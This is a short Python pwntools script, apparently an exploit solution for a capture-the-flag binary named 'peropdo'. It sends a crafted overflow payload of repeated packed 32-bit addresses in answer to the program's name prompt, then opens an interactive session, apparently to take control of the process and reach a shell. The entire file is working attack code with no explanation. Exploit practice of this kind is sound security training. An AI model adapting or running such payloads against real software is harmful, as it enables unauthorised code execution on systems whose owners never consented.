#!/usr/bin/python
from pwn import *

p = process('./peropdo')

p.recvuntil('name?')
p.sendline(p32(0xdeadbeef) + p32(0x80ecdec)*268 + p32(0x80ecdf4) + p32(0x80ecdec)*242)

p.interactive()
